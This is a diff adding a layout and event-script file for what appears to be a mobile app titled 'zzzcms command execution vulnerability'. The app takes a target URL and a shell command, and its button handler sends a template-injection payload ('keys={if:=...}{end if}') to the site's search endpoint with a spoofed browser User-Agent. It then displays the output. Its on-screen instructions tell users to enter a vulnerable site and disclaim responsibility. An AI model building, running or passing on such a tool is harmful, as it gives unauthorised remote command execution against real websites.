@@ -1,0 +1,198 @@
+<View id="2" did="0" type="LinearLayout">
+<ppt>width=-1
+height=50dp
+orientation=horizontal
+gravity=center_vertical
+background=#3385ff</ppt>
+<event></event>
+</View>
+<View id="9" did="2" type="ImageView">
+<ppt>width=27dp
+height=27dp
+src=@chevron left914.png
+layout_marginLeft=10dp
+layout_marginRight=15dp
+BackgroundRipple=#fffefefe
+
+</ppt>
+<event><eventItme type="clicki">end()</eventItme></event>
+</View>
+<View id="10" did="2" type="TextView">
+<ppt>width=-1
+height=-2
+text=zzzcms命令执行漏洞
+textColor=#ffffff
+textSize=16sp
+layout_weight=1
+textStyle=bold
+</ppt>
+<event></event>
+</View>
+<View id="22" did="0" type="LinearLayout">
+<ppt>width=-1
+height=-1
+orientation=vertical</ppt>
+<event></event>
+</View>
+<View id="1" did="22" type="LinearLayout">
+<ppt>width=-1
+height=-1
+orientation=vertical
+gravity=center_horizontal</ppt>
+<event></event>
+</View>
+<View id="3" did="1" type="CardView">
+<ppt>width=-1
+height=-2
+app_CardcornerRadius=20dp
+app_CardElevation=0dp
+layout_marginLeft=20dp
+layout_marginRight=20dp
+layout_marginTop=15dp</ppt>
+<event></event>
+</View>
+<View id="4" did="3" type="LinearLayout">
+<ppt>width=-1
+height=-2
+orientation=vertical</ppt>
+<event></event>
+</View>
+<View id="5" did="4" type="EditText">
+<ppt>width=-1
+height=-1
+text=
+hint=请输入url
+textSize=15sp
+background=#ffffffff
+layout_marginLeft=10dp
+textCursorDrawable=#FF00B2FF
+layout_marginRight=10dp
+</ppt>
+<event></event>
+</View>
+<View id="27" did="1" type="CardView">
+<ppt>width=-1
+height=-2
+app_CardcornerRadius=20dp
+app_CardElevation=0dp
+layout_marginLeft=20dp
+layout_marginRight=20dp
+layout_marginTop=15dp</ppt>
+<event></event>
+</View>
+<View id="28" did="27" type="LinearLayout">
+<ppt>width=-1
+height=-2
+orientation=vertical</ppt>
+<event></event>
+</View>
+<View id="29" did="28" type="EditText">
+<ppt>width=-1
+height=-1
+text=
+hint=请输入要执行的命令
+textSize=15sp
+background=#ffffffff
+layout_marginLeft=10dp
+textCursorDrawable=#FF00B2FF
+layout_marginRight=10dp
+</ppt>
+<event></event>
+</View>
+<View id="14" did="1" type="LinearLayout">
+<ppt>width=-1
+height=-2
+orientation=horizontal
+layout_marginRight=20dp
+layout_marginLeft=20dp</ppt>
+<event></event>
+</View>
+<View id="6" did="14" type="CardView">
+<ppt>width=-1
+height=-2
+app_CardcornerRadius=20dp
+app_CardElevation=0dp
+layout_marginRight=5dp
+layout_marginTop=15dp
+layout_weight=1</ppt>
+<event></event>
+</View>
+<View id="7" did="6" type="LinearLayout">
+<ppt>width=-1
+height=42dp
+orientation=vertical
+gravity=center
+background=#3385ff</ppt>
+<event><eventItme type="clicki">ug(5,"text",a)
+ug(32,"text",e)
+
+f(a=="")
+{
+  tws(v,"请输入url",0)
+}
+else
+{
+  t()
+  {
+    ss(a+"/?location=search",b)
+    hs(b,"keys={if:="+e+"}{end if}","utf8",",true","User-Agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36",c)
+    
+    syso(c)
+    ufnsui()
+    {
+      us(26,"text",c)
+    }
+  }
+}</eventItme></event>
+</View>
+<View id="8" did="7" type="TextView">
+<ppt>width=-2
+height=-2
+text=执行命令
+textColor=#ffffff
+textStyle=bold
+textSize=16sp</ppt>
+<event></event>
+</View>
+<View id="23" did="7" type="CoordinatorLayout">
+<ppt>width=-2
+height=-2</ppt>
+<event></event>
+</View>
+<View id="18" did="14" type="CardView">
+<ppt>width=-1
+height=-2
+app_CardcornerRadius=20dp
+app_CardElevation=0dp
+layout_marginLeft=2.5dp
+layout_marginRight=2.5dp
+layout_marginTop=15dp
+layout_weight=1</ppt>
+<event></event>
+</View>
+<View id="24" did="1" type="CardView">
+<ppt>width=-1
+height=-2
+app_CardcornerRadius=10dp
+app_CardElevation=0dp
+layout_marginLeft=20dp
+layout_marginRight=20dp
+layout_marginTop=25dp</ppt>
+<event></event>
+</View>
+<View id="25" did="24" type="LinearLayout">
+<ppt>width=-1
+height=-2
+orientation=vertical</ppt>
+<event></event>
+</View>
+<View id="26" did="25" type="TextView">
+<ppt>width=-2
+height=-2
+text=1.目标网站须为对应版本\n2.把url还有要执行的命令输进输入框\n3.然后点击按钮\n4.使用软件所造成一切问题与作者无关
+layout_margin=12dp
+textIsSelectable=true
+textSize=15sp</ppt>
+<event></event>
+</View>
+<UIEventset><eventItme type="loading">uycl(true)</eventItme></UIEventset>
